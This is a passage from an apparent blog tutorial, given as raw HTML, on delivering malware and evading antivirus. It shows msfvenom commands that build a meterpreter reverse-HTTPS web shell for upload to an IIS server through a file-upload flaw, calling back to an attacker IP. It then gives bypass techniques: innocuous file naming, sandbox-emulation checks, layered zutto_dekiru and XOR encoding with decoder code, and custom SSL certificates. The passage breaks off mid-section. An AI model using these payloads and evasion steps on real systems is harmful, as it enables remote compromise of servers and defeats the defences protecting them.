additional actions</strong>, such as<strong class="mo hb"> clicking on the downloaded malware</strong> or <strong class="mo hb">hooking up an external device</strong>. Some examples are provided below:</p><ul class=""><li id="ba0b" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Delivering the malware using the email with a malicious attachment.<br>For example, it could be a Microsoft Word Document with macro.</li><li id="b0af" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">Sending the victim a download link to the malware.</li><li id="24d5" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">Connecting an external device to the organization's machine.</li></ul><h2 id="8527" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">2. EXPLOITING A VULNERABLE WEBSERVER</h2><p id="1369" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">Another approach may be to try to exploit one of the organization’s machines by uploading malware directly to the webserver and trying to execute it.</p><h1 id="98d2" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">SCENARIO I</h1><p id="dc11" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">For the sake of simplicity, I will assume that you managed to exploit an <strong class="mo hb">Unrestricted File Upload</strong> vulnerability in the IIS web server and you can upload files with <strong class="mo hb">.aspx</strong> extensions to the webserver root directory.</p><ul class=""><li id="c2d5" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">If you upload <strong class="mo hb"><em class="wd">test.aspx</em></strong> with the below content and try to execute it using <strong class="mo hb"><em class="wd">http://</em>192.168.88.175<em class="wd">/test.aspx</em></strong> you see a <strong class="mo hb">blank page.</strong></li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="2613" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">&lt;%@ Page Language="C#" %&gt;<br>&lt;script runat="server"&gt;<br>&lt;/script&gt;</span></pre><ul class=""><li id="9700" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">On the other hand, if you generate&amp;upload a reverse shell meterpreter payload and then try to execute it using <a class="af te" href="http://192.168.88.175/platform.aspx" rel="noopener ugc nofollow" target="_blank"><strong class="mo hb"><em class="wd">http://</em>192.168.88.175<em class="wd">/</em>platform.aspx</strong></a><strong class="mo hb"> </strong>you will get an error.</li></ul><blockquote class="wm wn wo"><p id="0a13" class="mm mn wd mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">Operation did not complete successfully because the <strong class="mo hb">file contains a virus or potentially unwanted software</strong>.</p></blockquote><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="f333" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.175 LPORT=443 -f aspx -o <strong class="wf hb">platform.aspx</strong></span></pre><h1 id="257e" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">EVASIONS I</h1><p id="33d1" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">The above error shows up because the web shell gets flagged. In this section, you will learn techniques that should help you with bypassing anti-viruses.</p><h2 id="4fdb" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">NAMING</h2><ul class=""><li id="1859" class="mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj vt vu vv bh" data-selectable-paragraph="">As you noticed the generated reverse shell <strong class="mo hb">file name</strong> is <code class="cu wp wq wr wf b">platform.aspx</code>.<br>You should give a <strong class="mo hb">common name</strong> <strong class="mo hb">to your malware</strong>, not something like <code class="cu wp wq wr wf b"><em class="wd">malicious.exe</em></code> or <code class="cu wp wq wr wf b"><em class="wd">shell.php</em></code>. Such names can not only be detected by signature check of the anti-virus but also could be filtered by the firewall.</li><li id="472a" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">The same goes with the file extensions — check if the application interprets the malware by its content type, not its extension e.g. <code class="cu wp wq wr wf b">platform.txt</code> .</li><li id="e4ef" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">You should also consider changing the names of the variables in the code if you are using public web shells, but in this case, <strong class="mo hb">msfvenom </strong>chooses randomly generated strings that should not be detected by the signature scan.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl ws"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Y7o1Iq4fDhWqIFcSvfhdiw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="116" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*Y7o1Iq4fDhWqIFcSvfhdiw.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">Diff of the two generated platform.aspx showing randomly generated variable names.</figcaption></figure><h2 id="0906" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">EMULATION</h2><p id="f833" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph=""><em class="wd">Emulation</em> is an anti-virus technique that does not rely on the signature of a file but executes the code in the sandbox that <em class="wd">emulates</em> an operating system.</p><ul class=""><li id="6488" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">One of the drawbacks of OS emulated sandboxes is that the malware can use uncommon Windows API calls to <strong class="mo hb">crash the emulator. </strong>One of the non-emulated Windows APIs that can lead to a crash is <code class="cu wp wq wr wf b"><a class="af te" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma" rel="noopener ugc nofollow" target="_blank"><strong class="mo hb">VirtualAllocExNuma</strong></a></code>.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl ww"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tjTyAgtlTdtPcuJjwpQ-zw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*tjTyAgtlTdtPcuJjwpQ-zw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*tjTyAgtlTdtPcuJjwpQ-zw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*tjTyAgtlTdtPcuJjwpQ-zw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*tjTyAgtlTdtPcuJjwpQ-zw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*tjTyAgtlTdtPcuJjwpQ-zw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*tjTyAgtlTdtPcuJjwpQ-zw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*tjTyAgtlTdtPcuJjwpQ-zw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="270" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*tjTyAgtlTdtPcuJjwpQ-zw.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">(2) To use it you have to (1) import functions from external DLLs.</figcaption></figure><ul class=""><li id="b4b2" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Emulated sandboxes usually utilize fast-forwarding over the sleep functions to reduce heuristic check time. You can <strong class="mo hb">implement the sleep function</strong> in your code and check if it is being fast-forwarded. <br>If it is then it will exit before any suspect code is run.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl wx"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7ZzXxQ3XWEISnnB5x2ktDg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*7ZzXxQ3XWEISnnB5x2ktDg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*7ZzXxQ3XWEISnnB5x2ktDg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*7ZzXxQ3XWEISnnB5x2ktDg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*7ZzXxQ3XWEISnnB5x2ktDg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*7ZzXxQ3XWEISnnB5x2ktDg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*7ZzXxQ3XWEISnnB5x2ktDg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*7ZzXxQ3XWEISnnB5x2ktDg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="307" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*7ZzXxQ3XWEISnnB5x2ktDg.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">(2) To use it you have to (1) import functions from external DLLs.</figcaption></figure><h2 id="345f" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph=""><strong class="al">ENCODING</strong></h2><p id="c9d4" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">You can double encode your payload to bypass anti-virus signature checks.</p><ul class=""><li id="92bb" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">First using Msfvenom build-in encoder <code class="cu wp wq wr wf b"><strong class="mo hb">x64/zutto_dekiru</strong></code> which is not enough, because it has a build-in decoding loop that most AV engines can detect, but it is a great first-layer encoder to start.</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="c9fa" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.175 LPORT=443 -f aspx -o platform.aspx -e x64/zutto_dekiru -i 7</span></pre><ul class=""><li id="99de" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">The second layer will be a custom xor encoder, but to implement it you have to first encode your above-generated shellcode using <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/XOREncrypt.sln" rel="noopener ugc nofollow" target="_blank">XOREncrypt.sln</a></code></li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl wy"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TZLhH6zcMmi65xbF60-glA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*TZLhH6zcMmi65xbF60-glA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*TZLhH6zcMmi65xbF60-glA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*TZLhH6zcMmi65xbF60-glA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*TZLhH6zcMmi65xbF60-glA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*TZLhH6zcMmi65xbF60-glA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*TZLhH6zcMmi65xbF60-glA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*TZLhH6zcMmi65xbF60-glA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="221" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*TZLhH6zcMmi65xbF60-glA.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">(1) Place your first-stage encoded shellcode (2) chose the XOR encryption key.</figcaption></figure><ul class=""><li id="1250" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Compile and execute it to get the double encoded shellcode. Then implement XOR decoder and replace the shellcode in the <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/platform.aspx" rel="noopener ugc nofollow" target="_blank">platform.aspx</a></code>.</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="1a38" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">for (int i = 0; i &lt; buf.Length; i++)<br>{<br>    buf[i] = (byte)(buf[i] ^ (byte)'a');<br>}</span></pre><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl wz"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fSuwgbCDgmL8ZgU_4255FQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*fSuwgbCDgmL8ZgU_4255FQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fSuwgbCDgmL8ZgU_4255FQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fSuwgbCDgmL8ZgU_4255FQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fSuwgbCDgmL8ZgU_4255FQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fSuwgbCDgmL8ZgU_4255FQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fSuwgbCDgmL8ZgU_4255FQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*fSuwgbCDgmL8ZgU_4255FQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="118" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*fSuwgbCDgmL8ZgU_4255FQ.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">(1) Set your XOR decryption key and <strong class="bc oa">replace the “buf” variable</strong> name with your <strong class="bc oa">shellcode variable name</strong>.</figcaption></figure><h2 id="d429" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">CERTIFICATE</h2><p id="f071" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph=""><strong class="mo hb">Msfvenom </strong>randomizes SSL certificates. Such certificates could be detected by signature scanning. You can bypass it by creating your custom SSL certificate.</p><ul class=""><li id="3e47" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Create a self-signed certificate with custom details:</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="916c" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">openssl req -new -x509 -nodes -out cert.crt -keyout priv.key</span></pre><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xa"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KfOEP9XWRyYmjJBmfIuvmg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*KfOEP9XWRyYmjJBmfIuvmg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*KfOEP9XWRyYmjJBmfIuvmg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*KfOEP9XWRyYmjJBmfIuvmg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*KfOEP9XWRyYmjJBmfIuvmg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*KfOEP9XWRyYmjJBmfIuvmg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*KfOEP9XWRyYmjJBmfIuvmg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*KfOEP9XWRyYmjJBmfIuvmg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="270" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*KfOEP9XWRyYmjJBmfIuvmg.png"></picture></div></div></figure><ul class=""><li id="5f42" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Create a <code class="cu wp wq wr wf b">.pem</code> file:</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="4649" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">cat priv.key cert.crt &gt; custom.pem</span></pre><ul class=""><li id="05df" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Change <code class="cu wp wq wr wf b">CipherString=DEFAULT@SECLEVEL=2</code> in <code class="cu wp wq wr wf b">/etc/ssl/openssl.cnf</code> to:</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div class="nk nl xb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*M3gXVY8ivWG792ybLwvhLw.png 1100w, 